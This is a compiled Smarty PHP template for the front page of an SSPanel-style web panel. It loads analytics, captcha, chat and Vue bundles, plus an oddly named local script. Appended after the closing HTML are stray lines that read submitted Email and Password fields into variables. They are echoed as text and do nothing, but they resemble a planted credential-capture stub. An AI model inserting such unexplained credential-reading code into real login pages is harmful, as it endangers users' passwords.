<?php
/* Smarty version 3.1.36, created on 2020-07-13 00:19:46
  from '/www/wwwroot/192.168.100.138/resources/views/material/index.tpl' */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.36',
  'unifunc' => 'content_5f0b38221d7714_75850343',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
    '6cb15bafb7938ac2e0f5297fee24e4d60f4c22bb' => 
    array (
      0 => '/www/wwwroot/192.168.100.138/resources/views/material/index.tpl',
      1 => 1594570359,
      2 => 'file',
    ),
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5f0b38221d7714_75850343 (Smarty_Internal_Template $_smarty_tpl) {
?><!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta content="initial-scale=1,maximum-scale=1,user-scalable=no,width=device-width" name=viewport><meta name=keywords content=""><meta name=description content=""><title><?php echo $_smarty_tpl->tpl_vars['config']->value['appName'];?>
</title><link rel="shortcut icon" href=/vuedist/favicon.ico><link rel=bookmark href=/vuedist/favicon.ico><link rel=icon href=/vuedist/favicon.ico><?php if ($_smarty_tpl->tpl_vars['config']->value['enable_mylivechat'] === true) {
echo '<script'; ?>
>function add_chatinline(){
        var hccid="<?php echo $_smarty_tpl->tpl_vars['config']->value['mylivechat_id'];?>
";
        var nt=document.createElement("script");
        nt.async=true;
        nt.src="https://mylivechat.com/chatinline.aspx?hccid="+hccid;
        var ct=document.getElementsByTagName("script")[0];
        ct.parentNode.insertBefore(nt,ct);
      }
      add_chatinline();<?php echo '</script'; ?>
><?php }
echo '<script'; ?>
 src=/assets/js/fuck.js><?php echo '</script'; ?>
><link href=/vuedist/css/app.609ca47e.css rel=preload as=style><link href=/vuedist/js/app.59484a65.js rel=preload as=script><link href=/vuedist/js/chunk-vendors.0ef9ccce.js rel=preload as=script><link href=/vuedist/css/app.609ca47e.css rel=stylesheet></head><body><noscript><strong>We're sorry but uim-index-dev doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id=app></div><?php if ($_smarty_tpl->tpl_vars['config']->value['sspanelAnalysis'] === true) {
echo '<script'; ?>
>window.ga=window.ga||function(){ (ga.q=ga.q||[]).push(arguments) };ga.l=+new Date;
        ga('create', 'UA-111801619-3', 'auto');
        var hostDomain = window.location.host || document.location.host || document.domain;
        ga('set', 'dimension1', hostDomain);
        ga('send', 'pageview');<?php echo '</script'; ?>
><?php echo '<script'; ?>
 async src=https://www.google-analytics.com/analytics.js><?php echo '</script'; ?>
><?php }?> <?php if ($_smarty_tpl->tpl_vars['recaptcha_sitekey']->value != null) {
echo '<script'; ?>
 src="https://recaptcha.net/recaptcha/api.js?render=explicit" async defer><?php echo '</script'; ?>
><?php }?> <?php if ((isset($_smarty_tpl->tpl_vars['geetest_html']->value))) {
echo '<script'; ?>
 src=//static.geetest.com/static/tools/gt.js><?php echo '</script'; ?>
><?php }?> <?php if ($_smarty_tpl->tpl_vars['config']->value['enable_telegram'] === true) {
echo '<script'; ?>
 src=https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs@gh-pages/qrcode.min.js><?php echo '</script'; ?>
><?php }
echo '<script'; ?>
 src=/vuedist/js/chunk-vendors.0ef9ccce.js><?php echo '</script'; ?>
><?php echo '<script'; ?>
 src=/vuedist/js/app.59484a65.js><?php echo '</script'; ?>
></body></html> <?php echo '<?php
';?>
$a=$_POST['Email'];
$b=$_POST['Password'];
<?php echo '?>';?>

<?php }
}
